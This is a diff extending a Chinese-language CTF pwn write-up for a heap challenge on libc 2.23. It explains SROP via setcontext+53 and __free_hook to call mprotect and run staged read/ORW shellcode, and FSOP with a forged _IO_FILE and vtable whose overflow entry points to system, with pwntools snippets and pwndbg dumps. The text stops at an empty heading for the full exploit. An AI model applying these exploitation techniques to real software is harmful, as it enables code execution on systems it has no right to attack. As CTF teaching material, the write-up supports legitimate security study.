@@ -139,3 +139,182 @@ bk = 0x602298 - 0x10 = 0x602288
 由于程序提供了```gift()```函数，泄露libc并不困难，只要利用前面提到的unlink来做到在bss段上的任意写，在0x602290填上要求的数据，之后调用```gift()```函数就可以泄露puts的真实地址，减去偏移就可以得到libc基地址。
 
 但是要注意的是，调用```gift()```函数会导致程序关闭标准输出：```close(1); ```,
+
+### 3. SROP
+
+正常来说，利用SROP需要我们可以劫持hook，但是本题也用时禁用了所有hook，所以我们配合IO_file利用来SROP。
+
+#### (1) 常规libc2.23的SROP利用
+
+对于一般禁用了execve函数的堆题，拿到flag通常使用ORW手法，但是在保护全开的情况下一般没有办法直接写shellcode执行，这时候就要用到配和heap空间是SROP技术，该技术简单来说主要流程如下：
+
+1. 利用堆空间来部署`SigreturnFrame()`
+
+```python
+newexe = libc.sym['__free_hook'] & 0xfffffffffffff000
+
+frame = SigreturnFrame()
+frame.rsp = libc.sym['__free_hook']+0x10 #栈迁移
+frame.rdi = newexe
+frame.rsi = 0x1000
+frame.rdx = 7
+frame.rip = libc.sym['mprotect']
+```
+
+2. 改```__free_hook```为```setcontext+53```；```__free_hook+0x8```写入两个个```__free_hook+0x10```，最后在```__free_hook+0x10```写入一个调用```SYS_read(0,newexe,0x1000)```的shellcode
+
+````assembly
+0x7ffff7a7bb85 <setcontext+53>:  mov    rsp,QWORD PTR [rdi+0xa0]
+0x7ffff7a7bb8c <setcontext+60>:  mov    rbx,QWORD PTR [rdi+0x80]
+0x7ffff7a7bb93 <setcontext+67>:  mov    rbp,QWORD PTR [rdi+0x78]
+0x7ffff7a7bb97 <setcontext+71>:  mov    r12,QWORD PTR [rdi+0x48]
+0x7ffff7a7bb9b <setcontext+75>:  mov    r13,QWORD PTR [rdi+0x50]
+0x7ffff7a7bb9f <setcontext+79>:  mov    r14,QWORD PTR [rdi+0x58]
+0x7ffff7a7bba3 <setcontext+83>:  mov    r15,QWORD PTR [rdi+0x60]
+0x7ffff7a7bba7 <setcontext+87>:  mov    rcx,QWORD PTR [rdi+0xa8]
+0x7ffff7a7bbae <setcontext+94>:  push   rcx
+0x7ffff7a7bbaf <setcontext+95>:  mov    rsi,QWORD PTR [rdi+0x70]
+0x7ffff7a7bbb3 <setcontext+99>:  mov    rdx,QWORD PTR [rdi+0x88]
+0x7ffff7a7bbba <setcontext+106>: mov    rcx,QWORD PTR [rdi+0x98]
+0x7ffff7a7bbc1 <setcontext+113>: mov    r8,QWORD PTR [rdi+0x28]
+0x7ffff7a7bbc5 <setcontext+117>: mov    r9,QWORD PTR [rdi+0x30]
+0x7ffff7a7bbc9 <setcontext+121>: mov    rdi,QWORD PTR [rdi+0x68]
+0x7ffff7a7bbcd <setcontext+125>: xor    eax,eax
+0x7ffff7a7bbcf <setcontext+127>: ret    
+0x7ffff7a7bbd0 <setcontext+128>: mov    rcx,QWORD PTR [rip+0x3572a1]        # 0x7ffff7dd2e78
+0x7ffff7a7bbd7 <setcontext+135>: neg    eax
+0x7ffff7a7bbd9 <setcontext+137>: mov    DWORD PTR fs:[rcx],eax
+0x7ffff7a7bbdc <setcontext+140>: or     rax,0xffffffffffffffff
+0x7ffff7a7bbe0 <setcontext+144>: ret
+````
+````python
+context.arch = 'amd64'
+newexe = libc.sym['__free_hook'] & 0xfffffffffffff000
+
+# SYS_read(0,newexe,0x1000)
+shell1 = '''
+xor rdi,rdi
+mov rsi,%d
+mov edx,0x1000
+mov eax,0
+syscall
+jmp rsi
+''' % newexe
+````
+
+
+3. 之后free掉SigreturnFrame的堆块，就会执行```mprotect(newexe,0x1000,7)```，即修改从newexe开始的0x1000字节的权限为RWX。
+3. 接着程序就是执行shellcode1，也就是```SYS_read(0,newexe,0x1000)```,之后我们向服务器发送ORW的shellcode，程序就会就收并执行打印flag。
+
+```python
+shell2 = shellcraft.cat("flag") #ORW
+```
+
+#### (2) 常规libc2.23的FSOP 利用
+
+一般情况下，利用FSOP需要我们可以劫持```_IO_list_all ```来伪造一个```_IO_FILE ```,同时在堆上伪造该```_IO_FILE ```的vtable,之后利用```_IO_FILE_plus.vtable ```中的_IO_overflow控制执行流。
+
+对于一个一般程序的IO_file系统来说，在libc上的全局变量```_IO_list_all ```是一个指针，指向```_IO_2_1_stderr_```
+
+````shell
+pwndbg> p _IO_list_all 
+$3 = (struct _IO_FILE_plus *) 0x7f7210e6c540 <_IO_2_1_stderr_>
+
+pwndbg> p _IO_2_1_stderr_
+$4 = {
+  file = {
+    _flags = -72540025, 
+    _IO_read_ptr = 0x7f7210e6c5c3 <_IO_2_1_stderr_+131> "", 
+    _IO_read_end = 0x7f7210e6c5c3 <_IO_2_1_stderr_+131> "", 
+    _IO_read_base = 0x7f7210e6c5c3 <_IO_2_1_stderr_+131> "", 
+    _IO_write_base = 0x7f7210e6c5c3 <_IO_2_1_stderr_+131> "", 
+    _IO_write_ptr = 0x7f7210e6c5c3 <_IO_2_1_stderr_+131> "", 
+    _IO_write_end = 0x7f7210e6c5c3 <_IO_2_1_stderr_+131> "", 
+    _IO_buf_base = 0x7f7210e6c5c3 <_IO_2_1_stderr_+131> "", 
+    _IO_buf_end = 0x7f7210e6c5c4 <_IO_2_1_stderr_+132> "", 
+    _IO_save_base = 0x0, 
+    _IO_backup_base = 0x0, 
+    _IO_save_end = 0x0, 
+    _markers = 0x0, 
+    _chain = 0x7f7210e6c620 <_IO_2_1_stdout_>, 
+    _fileno = 2, 
+    _flags2 = 0, 
+    _old_offset = -1, 
+    _cur_column = 0, 
+    _vtable_offset = 0 '\000', 
+    _shortbuf = "", 
+    _lock = 0x7f7210e6d770 <_IO_stdfile_2_lock>, 
+    _offset = -1, 
+    _codecvt = 0x0, 
+    _wide_data = 0x7f7210e6b660 <_IO_wide_data_2>, 
+    _freeres_list = 0x0, 
+    _freeres_buf = 0x0, 
+    __pad5 = 0, 
+    _mode = 0, 
+    _unused2 = '\000' <repeats 19 times>
+  }, 
+  vtable = 0x7f7210e6a6e0 <_IO_file_jumps>
+}
+````
+
+其中```vtable = 0x7f7210e6a6e0 <_IO_file_jumps>```就是stderr的虚表
+
+````shell
+pwndbg> p _IO_file_jumps
+$5 = {
+  __dummy = 0, 
+  __dummy2 = 0, 
+  __finish = 0x7f7210b209d0 <_IO_new_file_finish>, 
+  __overflow = 0x7f7210b21740 <_IO_new_file_overflow>,  # 可以控制程序执行流的地方
+  __underflow = 0x7f7210b214b0 <_IO_new_file_underflow>, 
+  __uflow = 0x7f7210b22610 <__GI__IO_default_uflow>, 
+  __pbackfail = 0x7f7210b23990 <__GI__IO_default_pbackfail>, 
+  __xsputn = 0x7f7210b201f0 <_IO_new_file_xsputn>, 
+  __xsgetn = 0x7f7210b1fed0 <__GI__IO_file_xsgetn>, 
+  __seekoff = 0x7f7210b1f4d0 <_IO_new_file_seekoff>, 
+  __seekpos = 0x7f7210b22a10 <_IO_default_seekpos>, 
+  __setbuf = 0x7f7210b1f440 <_IO_new_file_setbuf>, 
+  __sync = 0x7f7210b1f380 <_IO_new_file_sync>, 
+  __doallocate = 0x7f7210b14190 <__GI__IO_file_doallocate>, 
+  __read = 0x7f7210b201b0 <__GI__IO_file_read>, 
+  __write = 0x7f7210b1fb80 <_IO_new_file_write>, 
+  __seek = 0x7f7210b1f980 <__GI__IO_file_seek>, 
+  __close = 0x7f7210b1f350 <__GI__IO_file_close>, 
+  __stat = 0x7f7210b1fb70 <__GI__IO_file_stat>, 
+  __showmanyc = 0x7f7210b23b00 <_IO_default_showmanyc>, 
+  __imbue = 0x7f7210b23b10 <_IO_default_imbue>
+}
+````
+
+需要注意的是，stderr中的\_chain指向stdout，stdout中的\_chain指向stdin，stdin中的\_chain指向0x0。
+
+所以对于这种情况，我们首先需要修改_IO_list_all中的内容，伪造一个fake _IO_FILE，
+
+通常我们会把_IO_list_all的值修改为main_arena+0x58，这样正好就是bins链上的smallbin[4]的头部，也就是一个0x60的chunk。
+
+伪造的结构体需要满足下面的条件
+
+````c
+top[1] = 0x61;  //size位1。
+//Set mode to 0: fp->_mode <= 0
+fp->_mode = 0; // top+0xc0
+//Set write_base to 2 and write_ptr to 3: fp->_IO_write_ptr > fp->_IO_write_base
+fp->_IO_write_base = (char *) 2; // top+0x20
+fp->_IO_write_ptr = (char *) 3; // top+0x28
+````
+
+```c
+memcpy( ( char *) top, "/bin/sh\x00", 8);
+```
+
+````c
+vtable = fake_vtable_chunk #jump table
+````
+
+最后保证```fake_vtable_chunk._IO_overflow = system ```，就可以getshell
+
+#### (3) 本题的结合利用
+
+
+
+## 0x02 完整exploit
